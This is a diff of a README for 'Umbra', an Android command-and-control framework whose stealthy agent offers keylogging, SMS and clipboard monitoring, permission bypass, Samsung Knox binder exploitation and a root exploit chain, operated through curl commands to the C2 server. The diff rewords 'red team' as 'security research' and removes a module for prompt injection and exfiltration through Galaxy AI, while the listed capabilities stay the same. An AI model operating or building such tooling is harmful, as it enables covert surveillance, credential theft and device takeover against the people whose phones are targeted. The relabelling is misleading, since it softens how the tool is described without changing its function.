@@ -1,4 +1,4 @@
-# Umbra — Android Red Team Framework
+# Umbra — Android Security Research Framework
 
 [![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL--3.0-blue.svg)](LICENSE)
 [![Platform: Android](https://img.shields.io/badge/Platform-Android-green.svg)](#)
@@ -6,9 +6,9 @@
 [![Agent: Kotlin](https://img.shields.io/badge/Agent-Kotlin-7F52FF.svg)](#)
 [![Transport: WSS + AES-256-GCM](https://img.shields.io/badge/Transport-WSS%20%2B%20AES--256--GCM-red.svg)](#)
 
-> **Umbra** is a self-hosted Android command-and-control (C2) framework for **authorized red-team engagements and security research**. It pairs a stealthy Kotlin agent disguised as *"Google Play Services"* with a GoFrame v2 C2 server and a zero-dependency web dashboard. All traffic is WebSocket-over-TLS (`wss://`) with per-message AES-256-GCM encryption.
+> **Umbra** is a self-hosted Android research framework for **authorized security assessment and device-analysis**. It pairs a stealthy Kotlin agent with a GoFrame v2 C2 server and a zero-dependency web dashboard. All traffic is WebSocket-over-TLS (`wss://`) with per-message AES-256-GCM encryption.
 
-> ⚠️ **Authorized use only.** Umbra ships with privilege-escalation, permission-bypass, keylogging, and device-exploitation capabilities that are illegal to use against devices you do not own or lack explicit written permission to test. See the [Legal & Ethical Disclaimer](#legal--ethical-disclaimer) before using this code.
+> ⚠️ **Authorized use only.** Umbra ships with privilege-escalation, permission-bypass, keylogging, and device-analysis capabilities that are illegal to use against devices you do not own or lack explicit written permission to test. See the [Legal & Ethical Disclaimer](#legal--ethical-disclaimer) before using this code.
 
 ---
 
@@ -123,10 +123,9 @@ UMBRA/
 | 10 | `camera` / `screenshot` | `capture` / `screenshot` | Camera capture + screen capture | ❌ Knox HAL blocks camera |
 | 11 | `silent_grant` | `grant` | 14 permission-bypass techniques | ❌ Android 16 blocks all 14 |
 | 12 | `knox` | `grant` `enumerate` `shell_exploit` | Samsung Knox binder exploitation | ✅ binder accessible |
-| 13 | `ai_inject` | `inject` `exfil` `status` | Galaxy AI prompt injection | ✅ Honeyboard detected |
-| 14 | `live` | `start` `stop` `status` | Real-time push monitoring (SMS, call state, clipboard) | ✅ |
-| 15 | `root` | `check` `exploit` `daemonize` `exploit_download` | 8-vector privilege-escalation chain | ⚠️ checks only, no root yet |
-| 16 | `keylog` | `start` `stop` `dump` `status` `start_keyboard` `enable_keyboard` | Keystroke capture (accessibility + IME) | ✅ both modes |
+| 13 | `live` | `start` `stop` `status` | Real-time push monitoring (SMS, call state, clipboard) | ✅ |
+| 14 | `root` | `check` `exploit` `daemonize` `exploit_download` | 8-vector privilege-escalation chain | ⚠️ checks only, no root yet |
+| 15 | `keylog` | `start` `stop` `dump` `status` `start_keyboard` `enable_keyboard` | Keystroke capture (accessibility + IME) | ✅ both modes |
 
 ### Additional Stealth Modules
 
@@ -238,7 +237,7 @@ adb shell am force-stop org.umbra.core
 adb shell am start -n org.umbra.core/.MainActivity
 ```
 
-> **Rebuild note:** the compiled APK hardcodes `DEFAULT_C2` in `Umbra-Client/app/src/main/java/org/umbra/core/core/SynapseEngine.kt`. If you need a fixed endpoint, change `DEFAULT_C2` there *before* building. The ADB override above is the fastest way to retarget an already-built APK.
+> **Rebuild note:** the compiled APK hardcodes `DEFAULT_C2` in `Umbra-Client/app/src/main/java/org/umbra/core/core/UmbraEngine.kt`. If you need a fixed endpoint, change `DEFAULT_C2` there *before* building. The ADB override above is the fastest way to retarget an already-built APK.
 
 ---
 
@@ -454,17 +453,7 @@ curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
   -d '{"device_id":"'$ID'","module":"knox","action":"shell_exploit"}'
 ```
 
-### 13. ai_inject
-
-```bash
-curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
-  -d '{"device_id":"'$ID'","module":"ai_inject","action":"inject"}'
-
-curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
-  -d '{"device_id":"'$ID'","module":"ai_inject","action":"status"}'
-```
-
-### 14. live
+### 13. live
 
 ```bash
 curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
@@ -477,7 +466,7 @@ curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
   -d '{"device_id":"'$ID'","module":"live","action":"stop"}'
 ```
 
-### 15. root
+### 14. root
 
 ```bash
 curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
@@ -487,7 +476,7 @@ curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
   -d '{"device_id":"'$ID'","module":"root","action":"exploit"}'
 ```
 
-### 16. keylog (see [Keylogger Activation](#keylogger-activation-accessibility--ime))
+### 15. keylog (see [Keylogger Activation](#keylogger-activation-accessibility--ime))
 
 ```bash
 curl -k -X POST $URL/api/command -H "Content-Type: application/json" \
@@ -597,7 +586,7 @@ Open `https://YOUR_SERVER_IP:8443` in a browser.
 
 ## Legal & Ethical Disclaimer
 
-**Umbra is a red-team and security-research tool for use on systems you own or have explicit written authorization to test.**
+**Umbra is a security-research and device-analysis tool for use on systems you own or have explicit written authorization to test.**
 
 - Do **not** install or run Umbra on any device you do not own or lack permission to test. Unauthorized access to a computer or communications device is a crime in most jurisdictions (e.g., the US Computer Fraud and Abuse Act, the UK Computer Misuse Act, and analogous laws worldwide).
 - The authors provide this code **for educational and defensive purposes only** — to help researchers and defenders understand mobile threats, test defenses, and build detections.
